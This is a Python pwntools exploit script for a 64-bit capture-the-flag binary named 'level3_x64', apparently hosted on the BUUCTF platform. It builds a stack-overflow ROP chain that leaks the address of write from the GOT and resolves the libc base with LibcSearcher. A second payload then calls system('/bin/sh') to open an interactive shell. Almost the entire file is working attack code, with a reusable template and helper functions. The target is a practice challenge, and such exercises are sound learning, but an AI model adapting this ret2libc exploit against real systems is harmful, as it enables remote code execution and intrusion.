#!/usr/bin/python3
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *

local = 0
os_level = 64
binary_name = 'level3_x64'
remote_addr, port = 'node5.buuoj.cn:27446'.split(':')

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
    # libc = e.libc
else:
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)
    # libc = ELF('libc-2.23.so')

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
else:
    print('Error os!!!')
    exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
display = lambda x:log.success(x)
slp = lambda x:sleep(x)

def dbg():
    if local:
        gdb.attach(p)
        pause()
    else:
        pass

def ret2libc(leak,func,path=''):
    if path == '':
        libc = LibcSearcher(func,leak)
        base = leak - libc.dump(func)
        system = base + libc.dump('system')
        bin_sh = base + libc.dump('str_bin_sh')

    else:
        libc = ELF(path)
        base = leak - libc.dump(func)
        system = base + libc.dump('system')
        bin_sh = base + libc.dump('str_bin_sh')

    return (system, bin_sh)

#Main function
if __name__ == '__main__':
    #you can add your code here
    prdi = 0x00000000004006b3
    prsi_r15 = 0x00000000004006b1
    ret = 0x0000000000400499
    write_plt = elf.plt['write']
    write_got = elf.got['write']
    main = elf.sym['main']
    payload = b'a'*0x80 + b'b'*0x8 + p64(prdi) + p64(1) + p64(prsi_r15) + p64(write_got) + p64(4)
    payload += p64(write_plt) + p64(main)
    #dbg()
    sla('Input:\n',payload)
    write_addr = u64(rc(6).ljust(8,b'\x00'))
    display(f'write--> {hex(write_addr)}')
    system,bin_sh = ret2libc(write_addr,'write')
    payload = b'a'*0x80 + b'b'*0x8 + p64(prdi) + p64(bin_sh) + p64(ret) + p64(system)
    sla('Input:\n',payload)
    p.interactive()